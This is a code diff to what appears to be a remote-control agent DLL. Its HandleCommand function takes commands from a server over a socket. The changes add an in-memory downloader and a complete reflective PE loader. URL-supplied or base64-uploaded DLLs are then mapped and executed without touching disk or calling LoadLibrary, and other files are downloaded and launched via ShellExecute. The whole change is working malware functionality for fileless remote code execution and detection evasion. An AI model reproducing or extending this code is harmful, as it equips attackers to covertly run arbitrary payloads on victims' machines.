@@ -3,6 +3,7 @@
 #include <winsock2.h>
 #include <shellapi.h>
 #include <urlmon.h>
+#include <wininet.h>
 #include <iostream>
 #include <string>
 #include <vector>
@@ -14,6 +15,7 @@
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "wininet.lib")
 
 using json = nlohmann::json;
 using namespace std;
@@ -77,6 +79,140 @@ string getFileNameOrRandom(const string& url, const string& ext) {
     return "temp_exec_" + to_string(GetTickCount64()) + ext;
 }
 
+// Download file into Memory
+vector<uint8_t> downloadToMemory(const string& url) {
+    vector<uint8_t> buffer;
+    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (hInternet) {
+        HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+        if (hUrl) {
+            unsigned char temp[4096];
+            DWORD bytesRead = 0;
+            while (InternetReadFile(hUrl, temp, sizeof(temp), &bytesRead) && bytesRead > 0) {
+                buffer.insert(buffer.end(), temp, temp + bytesRead);
+            }
+            InternetCloseHandle(hUrl);
+        }
+        InternetCloseHandle(hInternet);
+    }
+    return buffer;
+}
+
+// Custom PE Reflective Manual Mapper (No disk writing, no LoadLibrary)
+HMODULE reflectiveLoadDLL(const vector<uint8_t>& dllBytes) {
+    unsigned char* pSrc = const_cast<unsigned char*>(dllBytes.data());
+
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrc;
+    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrc + pDosHeader->e_lfanew);
+    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return NULL;
+
+    // Allocate memory for the image
+    unsigned char* pBase = (unsigned char*)VirtualAlloc(NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!pBase) return NULL;
+
+    // Copy headers
+    memcpy(pBase, pSrc, pNtHeaders->OptionalHeader.SizeOfHeaders);
+
+    // Copy sections
+    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
+    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
+        if (pSectionHeader[i].SizeOfRawData > 0) {
+            memcpy(pBase + pSectionHeader[i].VirtualAddress, pSrc + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData);
+        }
+    }
+
+    // Base relocations
+    IMAGE_DATA_DIRECTORY relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    if (relocDir.Size > 0) {
+        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(pBase + relocDir.VirtualAddress);
+        uintptr_t delta = (uintptr_t)(pBase - pNtHeaders->OptionalHeader.ImageBase);
+        while (pReloc->VirtualAddress != 0) {
+            DWORD size = pReloc->SizeOfBlock;
+            DWORD count = (size - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
+            USHORT* pList = (USHORT*)((unsigned char*)pReloc + sizeof(IMAGE_BASE_RELOCATION));
+            for (DWORD i = 0; i < count; i++) {
+                USHORT type = pList[i] >> 12;
+                USHORT offset = pList[i] & 0x0FFF;
+                if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) {
+                    uintptr_t* pAddress = (uintptr_t*)(pBase + pReloc->VirtualAddress + offset);
+                    *pAddress += delta;
+                }
+            }
+            pReloc = (PIMAGE_BASE_RELOCATION)((unsigned char*)pReloc + size);
+        }
+    }
+
+    // Import directory
+    IMAGE_DATA_DIRECTORY importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    if (importDir.Size > 0) {
+        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pBase + importDir.VirtualAddress);
+        while (pImportDesc->Name != 0) {
+            char* pDllName = (char*)(pBase + pImportDesc->Name);
+            HMODULE hDll = LoadLibraryA(pDllName);
+            if (!hDll) return NULL;
+
+            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pBase + pImportDesc->FirstThunk);
+            PIMAGE_THUNK_DATA pOriginalThunk = pThunk;
+            if (pImportDesc->OriginalFirstThunk != 0) {
+                pOriginalThunk = (PIMAGE_THUNK_DATA)(pBase + pImportDesc->OriginalFirstThunk);
+            }
+
+            while (pOriginalThunk->u1.AddressOfData != 0) {
+                FARPROC pFunc = NULL;
+                if (IMAGE_SNAP_BY_ORDINAL(pOriginalThunk->u1.Ordinal)) {
+                    pFunc = GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(pOriginalThunk->u1.Ordinal));
+                } else {
+                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(pBase + pOriginalThunk->u1.AddressOfData);
+                    pFunc = GetProcAddress(hDll, (LPCSTR)pImportByName->Name);
+                }
+
+                if (!pFunc) return NULL;
+
+                pThunk->u1.Function = (uintptr_t)pFunc;
+
+                pThunk++;
+                pOriginalThunk++;
+            }
+            pImportDesc++;
+        }
+    }
+
+    // Call DllMain
+    typedef BOOL(WINAPI* LPDLLMAIN)(HINSTANCE, DWORD, LPVOID);
+    if (pNtHeaders->OptionalHeader.AddressOfEntryPoint != 0) {
+        LPDLLMAIN pDllMain = (LPDLLMAIN)(pBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
+        pDllMain((HINSTANCE)pBase, DLL_PROCESS_ATTACH, NULL);
+    }
+
+    return (HMODULE)pBase;
+}
+
+// Resolve export from manual mapped module
+FARPROC resolveExport(HMODULE hMod, const char* name) {
+    unsigned char* pBase = (unsigned char*)hMod;
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBase;
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);
+
+    IMAGE_DATA_DIRECTORY exportDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+    if (exportDir.Size == 0) return NULL;
+
+    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportDir.VirtualAddress);
+    DWORD* pNames = (DWORD*)(pBase + pExport->AddressOfNames);
+    DWORD* pFuncs = (DWORD*)(pBase + pExport->AddressOfFunctions);
+    USHORT* pOrdinals = (USHORT*)(pBase + pExport->AddressOfNameOrdinals);
+
+    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
+        char* pName = (char*)(pBase + pNames[i]);
+        if (strcmp(pName, name) == 0) {
+            DWORD funcRVA = pFuncs[pOrdinals[i]];
+            return (FARPROC)(pBase + funcRVA);
+        }
+    }
+    return NULL;
+}
+
 // Send response JSON to Server
 void sendResponse(SOCKET sock, const string& status, const string& message) {
     json j;
@@ -109,6 +245,34 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
                 return;
             }
 
+            // Execute file or reflective DLL load
+            if (endsWith(toLower(url), ".dll")) {
+                SOCKET currentSock = sock;
+                string currentUrl = url;
+                thread([currentUrl, currentSock]() {
+                    vector<uint8_t> downloadedBytes = downloadToMemory(currentUrl);
+                    if (downloadedBytes.empty()) {
+                        sendResponse(currentSock, "error", "Failed to download remote DLL into memory");
+                        return;
+                    }
+
+                    HMODULE hMod = reflectiveLoadDLL(downloadedBytes);
+                    if (hMod) {
+                        typedef void (*PluginEntry)(SOCKET);
+                        PluginEntry func = (PluginEntry)resolveExport(hMod, "RunPlugin");
+                        if (func) {
+                            try { func(currentSock); } catch (...) {}
+                            sendResponse(currentSock, "success", "Successfully downloaded, reflectively loaded DLL in-memory, and executed RunPlugin.");
+                        } else {
+                            sendResponse(currentSock, "success", "Successfully downloaded and reflectively loaded DLL in-memory (no RunPlugin export found).");
+                        }
+                    } else {
+                        sendResponse(currentSock, "error", "Failed to reflectively load downloaded DLL from memory");
+                    }
+                }).detach();
+                return;
+            }
+
             char tempDir[MAX_PATH];
             if (GetTempPathA(MAX_PATH, tempDir) == 0) {
                 sendResponse(sock, "error", "Failed to get temp path");
@@ -132,28 +296,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
                 return;
             }
 
-            // Execute file or dynamic DLL load
-            if (endsWith(toLower(destFile), ".dll")) {
-                SOCKET currentSock = sock;
-                string currentFile = destFile;
-                thread([currentFile, currentSock]() {
-                    HMODULE hMod = LoadLibraryA(currentFile.c_str());
-                    if (hMod) {
-                        typedef void (*PluginEntry)(SOCKET);
-                        PluginEntry func = (PluginEntry)GetProcAddress(hMod, "RunPlugin");
-                        if (func) {
-                            func(currentSock);
-                        }
-                    }
-                }).detach();
-                sendResponse(sock, "success", "Successfully downloaded and loaded DLL: " + destFile);
+            HINSTANCE hInst = ShellExecuteA(NULL, "open", destFile.c_str(), NULL, NULL, SW_SHOW);
+            if ((uintptr_t)hInst <= 32) {
+                sendResponse(sock, "error", "Failed to execute downloaded file (" + destFile + "). Error code: " + to_string((uintptr_t)hInst));
             } else {
-                HINSTANCE hInst = ShellExecuteA(NULL, "open", destFile.c_str(), NULL, NULL, SW_SHOW);
-                if ((uintptr_t)hInst <= 32) {
-                    sendResponse(sock, "error", "Failed to execute downloaded file (" + destFile + "). Error code: " + to_string((uintptr_t)hInst));
-                } else {
-                    sendResponse(sock, "success", "Successfully downloaded and executed: " + destFile);
-                }
+                sendResponse(sock, "success", "Successfully downloaded and executed: " + destFile);
             }
         }
         else if (action == "remote_execute_local") {
@@ -170,6 +317,29 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
                 return;
             }
 
+            vector<uint8_t> decodedBytes = base64_decode(content64);
+
+            // Execute DLL reflectively (No disk write, no LoadLibrary)
+            if (endsWith(toLower(filename), ".dll")) {
+                SOCKET currentSock = sock;
+                thread([decodedBytes, currentSock]() {
+                    HMODULE hMod = reflectiveLoadDLL(decodedBytes);
+                    if (hMod) {
+                        typedef void (*PluginEntry)(SOCKET);
+                        PluginEntry func = (PluginEntry)resolveExport(hMod, "RunPlugin");
+                        if (func) {
+                            try { func(currentSock); } catch (...) {}
+                            sendResponse(currentSock, "success", "Successfully reflectively loaded DLL in-memory and executed RunPlugin.");
+                        } else {
+                            sendResponse(currentSock, "success", "Successfully reflectively loaded DLL in-memory (no RunPlugin export found).");
+                        }
+                    } else {
+                        sendResponse(currentSock, "error", "Failed to reflectively load DLL from memory");
+                    }
+                }).detach();
+                return;
+            }
+
             char tempDir[MAX_PATH];
             if (GetTempPathA(MAX_PATH, tempDir) == 0) {
                 sendResponse(sock, "error", "Failed to get temp path");
@@ -177,8 +347,6 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
             }
 
             string destFile = string(tempDir) + filename;
-            vector<uint8_t> decodedBytes = base64_decode(content64);
-
             ofstream ofs(destFile, ios::binary);
             if (!ofs.is_open()) {
                 sendResponse(sock, "error", "Failed to create local file in temp folder: " + destFile);
@@ -188,28 +356,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
             ofs.write((const char*)decodedBytes.data(), decodedBytes.size());
             ofs.close();
 
-            // Execute file or dynamic DLL load
-            if (endsWith(toLower(destFile), ".dll")) {
-                SOCKET currentSock = sock;
-                string currentFile = destFile;
-                thread([currentFile, currentSock]() {
-                    HMODULE hMod = LoadLibraryA(currentFile.c_str());
-                    if (hMod) {
-                        typedef void (*PluginEntry)(SOCKET);
-                        PluginEntry func = (PluginEntry)GetProcAddress(hMod, "RunPlugin");
-                        if (func) {
-                            func(currentSock);
-                        }
-                    }
-                }).detach();
-                sendResponse(sock, "success", "Successfully uploaded and loaded DLL: " + destFile);
+            HINSTANCE hInst = ShellExecuteA(NULL, "open", destFile.c_str(), NULL, NULL, SW_SHOW);
+            if ((uintptr_t)hInst <= 32) {
+                sendResponse(sock, "error", "Failed to execute file (" + destFile + "). Error code: " + to_string((uintptr_t)hInst));
             } else {
-                HINSTANCE hInst = ShellExecuteA(NULL, "open", destFile.c_str(), NULL, NULL, SW_SHOW);
-                if ((uintptr_t)hInst <= 32) {
-                    sendResponse(sock, "error", "Failed to execute file (" + destFile + "). Error code: " + to_string((uintptr_t)hInst));
-                } else {
-                    sendResponse(sock, "success", "Successfully uploaded and executed: " + destFile);
-                }
+                sendResponse(sock, "success", "Successfully uploaded and executed: " + destFile);
             }
         }
         else {
